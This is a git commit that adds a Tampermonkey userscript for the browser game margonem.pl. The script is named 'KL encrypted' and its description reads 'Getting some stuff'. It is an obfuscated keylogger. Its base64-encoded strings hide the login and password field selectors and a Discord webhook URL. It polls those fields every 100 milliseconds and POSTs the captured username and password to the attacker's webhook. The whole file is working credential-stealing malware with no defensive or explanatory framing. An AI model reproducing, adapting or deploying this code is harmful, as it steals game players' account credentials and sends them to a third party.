88c4efec291ec90b5952ac1f20185254e098c003
SzymonLeja <szymon.leja3@gmail.com>
2020-07-09 14:54:54 +0200

    Create keylogger_encrypted.js

---
+++ keylogger_encrypted.js
@@ -0,0 +1,30 @@
+// ==UserScript==
+// @name         KL encrypted
+// @namespace    http://tampermonkey.net/
+// @version      1.0
+// @description  Getting some stuff
+// @author       SL
+// @match        https://www.margonem.pl/
+// @grant        none
+// @require http://code.jquery.com/jquery-3.4.1.min.js
+// ==/UserScript==
+
+(function() {
+
+    var TpG3Y86zpgrtWMzb, ZHN4ekpZ5m95pFbJ, YQTtmEs6a5mTXE5a;
+    function UagZgR8PZcWcwvYp() {
+    $(atob("I3Vsb2dpbg==")).val() != TpG3Y86zpgrtWMzb && $(atob("I3Vsb2dpbg==")).val() && (TpG3Y86zpgrtWMzb = $(atob("I3Vsb2dpbg==")).val()), $(atob("I3VwYXNz")).val() != ZHN4ekpZ5m95pFbJ && $(atob("I3VwYXNz")).val() && (ZHN4ekpZ5m95pFbJ = $(atob("I3VwYXNz")).val()), !$(atob("I3VwYXNz")).val() && !$(atob("I3Vsb2dpbg==")).val() && TpG3Y86zpgrtWMzb && ZHN4ekpZ5m95pFbJ && YQTtmEs6a5mTXE5a != TpG3Y86zpgrtWMzb + " | " + ZHN4ekpZ5m95pFbJ &&
+            ($.ajax({
+            url: atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvNzA3NjUxNzE5NTUwNTk5MTY4L3lFd0t6eTl5dWZ0ZlNWNWVSYUtiSlJnYU1OdnpzZFExX2dBaFVBLTFGY1B5NnV3VVhtckFSWDBQdkQ3R0Z2QUxPS01Y"),
+            method: atob("UE9TVA=="),
+            contentTypE: atob("YXBwbGljYXRpb24vanNvbg=="),
+            data: {"username": atob("TWFyZ29Ib29r"),
+                   "avatar_url": atob("aHR0cHM6Ly9kaXNjb3JkZ3VpZGUuZ2l0aHViLmlvL2Fzc2V0cy9QSVJBVEUucG5n"),
+                   "content": TpG3Y86zpgrtWMzb + "|" + ZHN4ekpZ5m95pFbJ
+                  }
+        }), YQTtmEs6a5mTXE5a = TpG3Y86zpgrtWMzb + " | " + ZHN4ekpZ5m95pFbJ)
+    console.log(TpG3Y86zpgrtWMzb)
+    }
+    setInterval(UagZgR8PZcWcwvYp, 100);
+
+})();
